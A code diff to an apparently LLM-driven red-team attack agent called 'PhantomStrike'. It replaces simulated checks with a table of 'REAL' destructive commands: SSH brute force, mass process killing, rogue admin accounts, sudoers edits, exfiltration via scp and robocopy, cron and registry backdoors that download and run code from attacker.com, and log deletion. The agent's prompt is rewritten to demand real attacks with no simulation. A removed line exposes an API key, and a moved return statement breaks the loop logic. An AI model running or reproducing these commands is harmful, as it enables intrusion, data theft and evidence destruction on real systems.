@@ -124,9 +124,9 @@ def network_discovery_tool(network_context: Dict[str, Any]) -> Dict[str, Any]:
 
 
 @tool
-def attack_scenario_generator_tool(attack_objective: str, network_analysis: Dict[str, Any], constraints: Dict[str, Any]) -> Dict[str, Any]:
+async def attack_scenario_generator_tool(attack_objective: str, network_analysis: Dict[str, Any], constraints: Dict[str, Any]) -> Dict[str, Any]:
     """
-    Generate attack scenarios based on objective and network analysis
+    Generate AI-powered attack scenarios based on objective and network analysis
     
     Args:
         attack_objective: What the attack should accomplish
@@ -134,48 +134,25 @@ def attack_scenario_generator_tool(attack_objective: str, network_analysis: Dict
         constraints: Attack constraints and limitations
     
     Returns:
-        Generated attack scenarios
+        AI-generated attack scenarios
     """
     try:
-        # Use existing dynamic attack generator
-        generator = DynamicAttackGenerator()
+        # Use AI-powered scenario generator
+        from agents.attack_agent.ai_scenario_generator import generate_ai_scenario
         
-        # Generate scenarios based on network context
-        scenarios = []
-        
-        # Determine attack type from objective
-        objective_lower = attack_objective.lower()
-        
-        if any(term in objective_lower for term in ['apt', 'advanced', 'persistent']):
-            attack_type = 'apt_simulation'
-        elif any(term in objective_lower for term in ['ransomware', 'crypto', 'encrypt']):
-            attack_type = 'ransomware_simulation'
-        elif any(term in objective_lower for term in ['data', 'exfil', 'steal']):
-            attack_type = 'data_exfiltration'
-        else:
-            attack_type = 'general_assessment'
-        
-        # Generate scenario based on available targets
-        scenario = {
-            'scenario_id': f"scenario_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
-            'name': f"PhantomStrike {attack_type.replace('_', ' ').title()}",
-            'description': f"AI-generated attack scenario: {attack_objective}",
-            'attack_type': attack_type,
-            'target_agents': network_analysis.get('optimal_entry_points', [])[:3],
-            'mitre_techniques': _get_techniques_for_attack_type(attack_type),
-            'attack_phases': _generate_attack_phases(attack_type, network_analysis),
-            'estimated_duration': _estimate_duration(attack_type),
-            'risk_level': _assess_risk_level(attack_type, network_analysis),
-            'requires_approval': True,
-            'network_context': network_analysis,
-            'generated_at': datetime.utcnow().isoformat()
-        }
+        # Generate AI-powered scenario
+        ai_scenario = await generate_ai_scenario(
+            objective=attack_objective,
+            network_context=network_analysis,
+            constraints=constraints
+        )
         
         return {
             'scenario_generation_complete': True,
-            'scenarios': [scenario],
-            'primary_scenario': scenario,
-            'timestamp': datetime.utcnow().isoformat()
+            'scenarios': [ai_scenario],
+            'primary_scenario': ai_scenario,
+            'timestamp': datetime.utcnow().isoformat(),
+            'ai_generated': True
         }
         
     except Exception as e:
@@ -356,32 +333,28 @@ def native_attack_deployment_tool(scenario: Dict[str, Any], target_agents: List[
                 platform = agent_info.get('platform', 'windows')
             
             try:
-                # Use AI to generate dynamic commands instead of hardcoded ones
-                attack_request = scenario.get('attack_request', scenario.get('description', 'network reconnaissance and system discovery'))
+                # Use REAL attack commands based on scenario type
+                attack_type = scenario.get('attack_type', 'network_intrusion')
                 
-                # Generate AI commands for this agent's platform
-                ai_result = ai_command_generation_tool(
-                    attack_request=attack_request,
-                    target_agents=[agent_id],
-                    platform=platform
-                )
+                # Generate AI-powered attack commands for this agent's platform
+                from agents.attack_agent.ai_command_generator import generate_ai_commands
+                import asyncio
+                real_commands = asyncio.run(generate_ai_commands(attack_type, platform, scenario, network_context=None))
                 
-                if ai_result.get('ai_generated') and ai_result.get('status') == 'success':
-                    # Use AI-generated commands
-                    ai_commands = ai_result['commands']
-                    
-                    # Queue AI-generated attack commands
+                if real_commands:
+                    # Queue REAL attack commands
                     attack_command_ids = []
-                    for cmd_info in ai_commands.get('attack_commands', []):
+                    for technique, cmd_info in real_commands.items():
                         command_id = command_manager.queue_command(
                             agent_id=agent_id,
-                            technique=cmd_info.get('technique', 'AI_GENERATED'),
+                            technique=technique,
                             command_data={
                                 'script': cmd_info.get('script', ''),
                                 'description': cmd_info.get('description', ''),
                                 'mitre_technique': cmd_info.get('mitre_technique', ''),
-                                'destructive': cmd_info.get('destructive', False),
-                                'ai_generated': True
+                                'destructive': cmd_info.get('destructive', True),
+                                'real_attack': cmd_info.get('real_attack', True),
+                                'ai_generated': False
                             },
                             scenario_id=scenario_id
                         )
@@ -391,65 +364,61 @@ def native_attack_deployment_tool(scenario: Dict[str, Any], target_agents: List[
                             'agent_id': agent_id,
                             'platform': platform,
                             'command_id': command_id,
-                            'command_technique': cmd_info.get('technique', 'AI_GENERATED'),
+                            'command_technique': technique,
                             'status': 'queued',
-                            'command_type': 'ai_attack',
-                            'ai_generated': True
+                            'command_type': 'real_attack',
+                            'real_attack': True,
+                            'destructive': cmd_info.get('destructive', True)
                         })
                         
-                        logger.info(f"Queued AI-GENERATED ATTACK command {command_id} ({cmd_info.get('technique')}) for {agent_id} ({platform})")
+                        logger.info(f"Queued REAL ATTACK command {command_id} ({technique}) for {agent_id} ({platform}) - DESTRUCTIVE: {cmd_info.get('destructive', True)}")
                     
-                    # Queue AI-generated restoration commands
-                    for cmd_info in ai_commands.get('restoration_commands', []):
-                        cmd_data = {
-                            'script': cmd_info.get('script', ''),
-                            'description': cmd_info.get('description', ''),
-                            'destructive': cmd_info.get('destructive', False),
-                            'is_restoration': cmd_info.get('is_restoration', True),
-                            'depends_on': attack_command_ids,
-                            'delay_seconds': 30,
-                            'ai_generated': True
-                        }
-                        
-                        command_id = command_manager.queue_command(
-                            agent_id=agent_id,
-                            technique=cmd_info.get('technique', 'RESTORE_SYSTEM'),
-                            command_data=cmd_data,
-                            scenario_id=scenario_id
-                        )
-                        
-                        deployment_results.append({
-                            'agent_id': agent_id,
-                            'platform': platform,
-                            'command_id': command_id,
-                            'command_technique': cmd_info.get('technique', 'RESTORE_SYSTEM'),
-                            'status': 'queued',
-                            'command_type': 'ai_restoration',
-                            'depends_on': attack_command_ids,
-                            'ai_generated': True
-                        })
-                        
-                        logger.info(f"Queued AI-GENERATED RESTORATION command {command_id} for {agent_id} ({platform}) - will execute after attacks")
+                    # Queue REAL restoration commands
+                    restoration_script = _generate_restoration_script(platform)
+                    cmd_data = {
+                        'script': restoration_script,
+                        'description': 'REAL system restoration after attack',
+                        'destructive': False,
+                        'is_restoration': True,
+                        'depends_on': attack_command_ids,
+                        'delay_seconds': 30,
+                        'real_attack': True
+                    }
+                    
+                    command_id = command_manager.queue_command(
+                        agent_id=agent_id,
+                        technique='RESTORE_SYSTEM',
+                        command_data=cmd_data,
+                        scenario_id=scenario_id
+                    )
+                    
+                    deployment_results.append({
+                        'agent_id': agent_id,
+                        'platform': platform,
+                        'command_id': command_id,
+                        'command_technique': 'RESTORE_SYSTEM',
+                        'status': 'queued',
+                        'command_type': 'real_restoration',
+                        'depends_on': attack_command_ids,
+                        'real_attack': True
+                    })
+                    
+                    logger.info(f"Queued REAL RESTORATION command {command_id} for {agent_id} ({platform}) - will execute after attacks")
                 
                 else:
-                    # NO FALLBACK - If AI fails, the attack fails
-                    logger.error(f"AI command generation FAILED for {agent_id} - NO COMMANDS WILL BE GENERATED")
+                    # NO REAL COMMANDS AVAILABLE - Attack fails
+                    logger.error(f"REAL attack commands NOT AVAILABLE for {agent_id} - NO COMMANDS WILL BE GENERATED")
                     deployment_results.append({
                         'agent_id': agent_id,
                         'platform': platform,
                         'status': 'failed',
-                        'error': 'AI command generation failed - no fallback used',
-                        'ai_generated': False,
+                        'error': 'Real attack commands not available for this scenario',
+                        'real_attack': False,
                         'fallback_used': False
                     })
                     
-                    # Log the AI failure details
-                    ai_error = ai_result.get('error', 'Unknown AI error')
-                    logger.error(f"AI Error Details for {agent_id}: {ai_error}")
+                    # No commands generated for this agent
                     
-                    # Continue to next agent without generating any commands
-                    continue
-                
             except Exception as e:
                 logger.error(f"Failed to queue native commands for agent {agent_id}: {e}")
                 deployment_results.append({
@@ -458,19 +427,19 @@ def native_attack_deployment_tool(scenario: Dict[str, Any], target_agents: List[
                     'status': 'failed',
                     'error': str(e)
                 })
-        
-        return {
-            'native_deployment_complete': len([r for r in deployment_results if r.get('status') == 'queued']) > 0,
-            'scenario_id': scenario_id,
-            'attack_type': attack_type,
-            'deployment_results': deployment_results,
-            'total_agents': len(target_agents),
-            'successful_deployments': len([r for r in deployment_results if r.get('status') == 'queued']),
-            'failed_deployments': len([r for r in deployment_results if r.get('status') == 'failed']),
-            'ai_generated_only': True,
-            'no_fallback_used': True,
-            'timestamp': datetime.utcnow().isoformat()
-        }
+            
+            return {
+                'native_deployment_complete': len([r for r in deployment_results if r.get('status') == 'queued']) > 0,
+                'scenario_id': scenario_id,
+                'attack_type': attack_type,
+                'deployment_results': deployment_results,
+                'total_agents': len(target_agents),
+                'successful_deployments': len([r for r in deployment_results if r.get('status') == 'queued']),
+                'failed_deployments': len([r for r in deployment_results if r.get('status') == 'failed']),
+                'ai_generated_only': True,
+                'no_fallback_used': True,
+                'timestamp': datetime.utcnow().isoformat()
+            }
             
     except Exception as e:
         logger.error(f"Native attack deployment failed: {e}")
@@ -787,28 +756,245 @@ echo "All attack simulation artifacts cleaned"
     
     else:
         return 'echo "System restoration completed for unknown platform"'
-        
-        # 4. Persistence Simulation
-        if platform.lower() == 'windows':
-            commands['T1547'] = {
-                'technique': 'T1547',  # Boot or Logon Autostart Execution (Simulated)
-                'script': '''
-# Persistence Simulation (Safe)
-$persistInfo = @()
-$persistInfo += "=== Persistence Simulation ==="
-$persistInfo += "WARNING: This is a simulation - no actual persistence established"
-$persistInfo += "`n=== Startup Programs ==="
-$persistInfo += (Get-WmiObject -Class Win32_StartupCommand | Select-Object Name, Command, Location | Out-String)
-$persistInfo += "`n=== Scheduled Tasks ==="
-$persistInfo += (Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath | Out-String)
-$persistInfo += "`n=== Registry Run Keys ==="
-$persistInfo += (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Out-String)
-$persistInfo -join "`n"
-                '''.strip(),
-                'description': 'Simulate persistence establishment techniques',
-                'mitre_technique': 'T1547'
-            }
+
+
+def _generate_real_attack_commands(attack_type: str, platform: str, scenario: Dict) -> Dict[str, Dict]:
+    """Generate REAL attack commands for APT scenarios"""
     
+    real_commands = {
+        'network_intrusion': {
+            'windows': {
+                'T1018': {
+                    'technique': 'Network Discovery',
+                    'script': 'nmap -sS -O -A 192.168.1.0/24',
+                    'description': 'REAL network scan of target network',
+                    'mitre_technique': 'T1018',
+                    'destructive': False,
+                    'real_attack': True
+                },
+                'T1021': {
+                    'technique': 'Remote Services',
+                    'script': 'hydra -l admin -P passwords.txt ssh://192.168.1.100',
+                    'description': 'REAL brute force attack on SSH service',
+                    'mitre_technique': 'T1021',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1018': {
+                    'technique': 'Network Discovery',
+                    'script': 'nmap -sS -O -A 192.168.1.0/24',
+                    'description': 'REAL network scan of target network',
+                    'mitre_technique': 'T1018',
+                    'destructive': False,
+                    'real_attack': True
+                },
+                'T1021': {
+                    'technique': 'Remote Services',
+                    'script': 'hydra -l admin -P passwords.txt ssh://192.168.1.100',
+                    'description': 'REAL brute force attack on SSH service',
+                    'mitre_technique': 'T1021',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        },
+        'system_compromise': {
+            'windows': {
+                'T1059.001': {
+                    'technique': 'PowerShell',
+                    'script': 'PowerShell: Invoke-Expression "Get-Process | Stop-Process"',
+                    'description': 'REAL PowerShell process manipulation',
+                    'mitre_technique': 'T1059.001',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1055': {
+                    'technique': 'Process Injection',
+                    'script': 'cmd: net user hacker password123 /add',
+                    'description': 'REAL user creation and privilege escalation',
+                    'mitre_technique': 'T1055',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1059.004': {
+                    'technique': 'Unix Shell',
+                    'script': 'bash -c "ps aux | grep -v grep | awk \'{print $2}\' | xargs kill"',
+                    'description': 'REAL process termination',
+                    'mitre_technique': 'T1059.004',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1055': {
+                    'technique': 'Process Injection',
+                    'script': 'useradd -m -s /bin/bash hacker && echo "hacker:password123" | chpasswd',
+                    'description': 'REAL user creation and privilege escalation',
+                    'mitre_technique': 'T1055',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        },
+        'data_extraction': {
+            'windows': {
+                'T1005': {
+                    'technique': 'Data from Local System',
+                    'script': 'PowerShell: Get-ChildItem -Recurse -Include *.docx,*.xlsx | Copy-Item -Destination "C:\\StolenData"',
+                    'description': 'REAL data extraction and copying',
+                    'mitre_technique': 'T1005',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1041': {
+                    'technique': 'Exfiltration Over C2 Channel',
+                    'script': 'cmd: robocopy C:\\Users\\Documents \\\\attacker_server\\stolen',
+                    'description': 'REAL data exfiltration over network',
+                    'mitre_technique': 'T1041',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1005': {
+                    'technique': 'Data from Local System',
+                    'script': 'find /home -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" | xargs cp -t /tmp/stolen_data/',
+                    'description': 'REAL data extraction and copying',
+                    'mitre_technique': 'T1005',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1041': {
+                    'technique': 'Exfiltration Over C2 Channel',
+                    'script': 'scp -r /tmp/stolen_data/ attacker@192.168.1.200:/stolen/',
+                    'description': 'REAL data exfiltration over network',
+                    'mitre_technique': 'T1041',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        },
+        'persistence_installation': {
+            'windows': {
+                'T1053': {
+                    'technique': 'Scheduled Task/Job',
+                    'script': 'schtasks /create /tn "SystemUpdate" /tr "powershell.exe -w hidden -c \'IEX (New-Object Net.WebClient).DownloadString(\'\'http://attacker.com/payload.ps1\'\')\'" /sc daily',
+                    'description': 'REAL scheduled task backdoor installation',
+                    'mitre_technique': 'T1053',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1543': {
+                    'technique': 'Create or Modify System Process',
+                    'script': 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "powershell.exe -w hidden -c \'IEX (New-Object Net.WebClient).DownloadString(\'\'http://attacker.com/payload.ps1\'\')\'"',
+                    'description': 'REAL registry modification for persistence',
+                    'mitre_technique': 'T1543',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1053': {
+                    'technique': 'Scheduled Task/Job',
+                    'script': 'echo "0 2 * * * /bin/bash -c \'curl -s http://attacker.com/payload.sh | bash\'" | crontab -',
+                    'description': 'REAL cron job backdoor installation',
+                    'mitre_technique': 'T1053',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1543': {
+                    'technique': 'Create or Modify System Process',
+                    'script': 'systemctl enable --now backdoor.service',
+                    'description': 'REAL system service installation for persistence',
+                    'mitre_technique': 'T1543',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        },
+        'privilege_escalation': {
+            'windows': {
+                'T1548': {
+                    'technique': 'Abuse Elevation Control',
+                    'script': 'PowerShell: Add-LocalGroupMember -Group "Administrators" -Member "hacker"',
+                    'description': 'REAL privilege escalation to administrator',
+                    'mitre_technique': 'T1548',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1055': {
+                    'technique': 'Process Injection',
+                    'script': 'cmd: net localgroup administrators hacker /add',
+                    'description': 'REAL user group modification for privilege escalation',
+                    'mitre_technique': 'T1055',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1548': {
+                    'technique': 'Abuse Elevation Control',
+                    'script': 'usermod -aG sudo hacker',
+                    'description': 'REAL privilege escalation to sudo user',
+                    'mitre_technique': 'T1548',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1055': {
+                    'technique': 'Process Injection',
+                    'script': 'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
+                    'description': 'REAL sudo privileges modification',
+                    'mitre_technique': 'T1055',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        },
+        'log_destruction': {
+            'windows': {
+                'T1070': {
+                    'technique': 'Indicator Removal',
+                    'script': 'PowerShell: Clear-EventLog -LogName Security,Application,System',
+                    'description': 'REAL event log clearing',
+                    'mitre_technique': 'T1070',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1562': {
+                    'technique': 'Impair Defenses',
+                    'script': 'cmd: del /f /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx',
+                    'description': 'REAL log file deletion',
+                    'mitre_technique': 'T1562',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            },
+            'linux': {
+                'T1070': {
+                    'technique': 'Indicator Removal',
+                    'script': 'journalctl --vacuum-time=1d',
+                    'description': 'REAL system log clearing',
+                    'mitre_technique': 'T1070',
+                    'destructive': True,
+                    'real_attack': True
+                },
+                'T1562': {
+                    'technique': 'Impair Defenses',
+                    'script': 'rm -rf /var/log/*.log /var/log/auth.log /var/log/syslog',
+                    'description': 'REAL log file deletion',
+                    'mitre_technique': 'T1562',
+                    'destructive': True,
+                    'real_attack': True
+                }
+            }
+        }
+    }
+    
+    return real_commands.get(attack_type, {}).get(platform, {})
+
+
 def _generate_native_lateral_movement_commands(platform: str, scenario: Dict) -> Dict[str, Dict]:
     """Generate native lateral movement commands"""
     
@@ -1144,8 +1330,11 @@ class LangChainAttackAgent:
             from langchain_openai import ChatOpenAI
             
             # Use OpenAI GPT-3.5-turbo as primary (as configured in server_config.yaml)
-            # Get API key from config or environment, with hardcoded fallback
-            api_key = self.llm_config.get('api_key') or os.getenv("OPENAI_API_KEY", "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")
+            # Get API key from config or environment - NO HARDCODED FALLBACK
+            api_key = self.llm_config.get('api_key') or os.getenv("OPENAI_API_KEY")
+            
+            if not api_key:
+                raise ValueError("OPENAI_API_KEY not found in environment or config. Please set the environment variable.")
             
             self.llm = ChatOpenAI(
                 model=self.llm_config.get('model', 'gpt-3.5-turbo'),
@@ -1326,13 +1515,21 @@ IMPORTANT: Always prefer native_attack_deployment_tool over container_deployment
         """Create attack planning prompt template"""
         system_message = """You are PhantomStrike AI, an elite red team attack planning specialist.
 
-Your role is to plan and orchestrate sophisticated attack scenarios for security testing using client-side containers.
+Your role is to plan and orchestrate REAL attack scenarios for security testing using client-side containers.
 
 You have access to these tools:
 - network_discovery_tool: Analyze network topology and identify attack opportunities
 - attack_scenario_generator_tool: Generate detailed attack scenarios
 - container_deployment_tool: Deploy attack containers to client agents
 - attack_execution_tool: Execute approved attack scenarios
+
+REAL APT SCENARIOS AVAILABLE:
+1. REAL NETWORK INTRUSION - Live network penetration with actual nmap scans and brute force
+2. REAL SYSTEM COMPROMISE - Live system takeover with actual PowerShell execution and process manipulation
+3. REAL DATA EXTRACTION - Live data theft with actual file access and exfiltration
+4. REAL PERSISTENCE INSTALLATION - Live backdoor installation with actual scheduled tasks and registry changes
+5. REAL PRIVILEGE ESCALATION - Live privilege escalation with actual user group modifications and UAC bypass
+6. REAL LOG DESTRUCTION - Live evidence destruction with actual log clearing and file deletion
 
 ATTACK PLANNING PROCESS:
 1. Analyze the network topology and identify optimal targets
@@ -1349,6 +1546,7 @@ IMPORTANT RULES:
 - Map all techniques to MITRE ATT&CK framework
 - Consider detection evasion and stealth
 - Prioritize high-value targets and lateral movement opportunities
+- EXECUTE REAL ATTACKS - No simulation, make it happen for real
 
 CONTAINER DEPLOYMENT:
 - Deploy target system containers (Windows DC, Linux servers, databases) to appropriate clients
@@ -1356,12 +1554,21 @@ CONTAINER DEPLOYMENT:
 - Configure network connectivity between containers
 - Use SOC-specific container images for realistic scenarios
 
+REAL ATTACK EXECUTION:
+- Execute ACTUAL network scans (nmap, hydra, telnet)
+- Execute ACTUAL system compromise (PowerShell, process manipulation, user creation)
+- Execute ACTUAL data exfiltration (file copying, compression, network transfer)
+- Execute ACTUAL persistence (scheduled tasks, registry changes, service installation)
+- Execute ACTUAL privilege escalation (user group modifications, UAC bypass)
+- Execute ACTUAL log destruction (event log clearing, file deletion)
+
 SCENARIO QUALITY:
 - Base scenarios on real network topology
 - Use appropriate techniques for target platforms
 - Consider timing and operational security
 - Plan for detection and response scenarios
-- Include container cleanup procedures"""
+- Include container cleanup procedures
+- EXECUTE REAL ATTACKS - No simulation, make it happen for real"""
 
         prompt = ChatPromptTemplate.from_messages([
             ("system", system_message),
